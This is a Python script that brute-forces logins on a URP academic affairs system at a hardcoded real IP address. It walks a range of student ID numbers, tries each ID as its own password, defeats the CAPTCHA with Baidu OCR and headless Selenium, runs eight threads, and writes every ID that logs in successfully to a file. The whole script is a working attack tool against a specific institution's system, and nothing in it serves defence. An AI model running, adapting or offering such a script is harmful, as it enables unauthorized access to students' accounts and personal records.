# -*-coding=utf-8-*-
from aip import AipOcr
from bs4 import BeautifulSoup
from selenium import webdriver
from PIL import Image
import time
import re
import threading

def get_file_content(filePath):
    with open(filePath, "rb") as fp:
        return fp.read()


# 验证码识别
def ocr(yzm_jpg):
    APP_ID = ""#你的百度APP_ID
    API_KEY = ""#你的API_KEY
    SECRET_KEY = ""#你的SECRET_KEY
    client = AipOcr(APP_ID, API_KEY, SECRET_KEY)
    allTexts = ""
    # 图片
    image = get_file_content(yzm_jpg)
    # 结果
    reslut = client.basicGeneral(image)
    for words in reslut["words_result"]:
        allTexts = allTexts + ''.join(words.get('words', ''))
    # 返回值放在allTexts
    return allTexts.replace(" ", "")


def urp1(start_id, end_id):
    # 建8个线程
    for i in range(8):
        urp_thread = myThread(i, "线程%d" % i, start_id, end_id)
        # urp_thread.setDaemon(True)
        urp_thread.start()
        # urp_thread.join()


def urp0(start_id, end_id):
    zjh = start_id
    while zjh <= end_id:
        student = urp(str(zjh), str(zjh))
        student.run()
        if student.status == 1:
            f.write(str(zjh) + "\n")
            f.flush()
        elif student.status == 2:
            pass
        elif student.status == 3:
            continue
        else:
            break
        zjh += 1


# class OcrError(Exception):
#     def __init__(self, value):
#         self.value = value
#
#     def __str__(self):
#         return repr(self.value)


class urp:
    brower = None
    v_yzm = ""
    zjh = ""
    mm = ""
    status = 0

    def __init__(self, zjh, mm):
        chromOptions = webdriver.ChromeOptions()
        chromOptions.add_argument("--headless")
        chromOptions.add_argument("--disable-gpu")
        self.brower = webdriver.Chrome(chrome_options=chromOptions)
        self.zjh = zjh
        self.bh = int(zjh) % 8
        self.mm = mm

    def run(self):
        try:
            url = "http://222.195.242.240:8080/loginAction.do"
            self.brower.get(url)
            html = self.brower.page_source
            # 验证码元素
            element = self.brower.find_element_by_id("vchart")
            bs = BeautifulSoup(html, "html.parser")
            rs = bs.select("#vchart")
            # 截全屏
            self.brower.save_screenshot("urp%s.png" % str(self.bh))
            #下面这个忽略，直接用测得的数据
            # 元素左上角顶点
            xPoint = element.location["x"]
            yPoint = element.location["y"]
            # 元素右下角顶点
            x2Point = xPoint + element.size["width"]
            y2Point = yPoint + element.size["height"]
            pictrue = Image.open("urp%s.png" % str(self.bh))

            # 无头
            pictrue = pictrue.crop((305, 327, 385, 347))
            # 有头
            # pictrue = pictrue.crop((527, 454, 625, 480))
            pictrue.save("yzm%s.png" % str(self.bh))
            # 识别验证码
            self.v_yzm = ocr("yzm%s.png" % str(self.bh))
            if (len(self.v_yzm) != 4):
                print("验证码错误")
                self.status = 3
                return
        
            zjh_input = self.brower.find_element_by_name("zjh")
            zjh_input.send_keys(self.zjh)
            mm_input = self.brower.find_element_by_name("mm")
            mm_input.send_keys(self.mm)
            v_yzm_input = self.brower.find_element_by_name("v_yzm")
            v_yzm_input.send_keys(self.v_yzm)
            time.sleep(1)
            # 登录元素
            login_element = self.brower.find_element_by_id("btnSure")
            login_element.click()
            time.sleep(1)
            html = self.brower.page_source
            if (bool(re.search(re.compile(r"URP综合教务系统-个人管理-我需留意-概览"), html))):
                print(self.zjh, "登录成功!")
                self.status = 1
            elif (bool(re.search(re.compile(r"您的密码不正确"), html))):
                print(self.zjh, "密码错误")
                self.status = 2
            else:
                print("验证码错误")
                self.status = 3
        except Exception as e:
            print(str(e))
            pass
        finally:
            try:
                self.brower.close()
                self.brower.quit()
                pass
            except Exception as e:
                print(str(e))
                pass


class myThread(threading.Thread):
    def __init__(self, threadID, name, start_id, end_id):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.start_id = start_id
        self.end_id = end_id

    def run(self):
        zjh = self.start_id
        while zjh <= self.end_id:
            if zjh % 8 == self.threadID:
                student = urp(str(zjh), str(zjh))
                student.run()
                if student.status == 1:
                    f.write(str(zjh) + "\n")
                    f.flush()
                elif student.status == 2:
                    pass
                elif student.status == 3:
                    continue
                else:
                    break
            zjh += 1


if __name__ == '__main__':
    start_id = int(input("请输入开始的学号:"))
    end_id = int(input("请输入结束的学号:"))
    file_name=input("请输入你要保存为的文件名:")
    f = open(file_name+".txt", "w")
    multithreading = int(input("是否使用多线程？是（1）否（0）"))
    try:
        if (multithreading == 1):
            urp1(start_id, end_id)
        else:
            urp0(start_id, end_id)
    except Exception as e:
        print(str(e))
        exit(1)
    finally:
        exit(0)

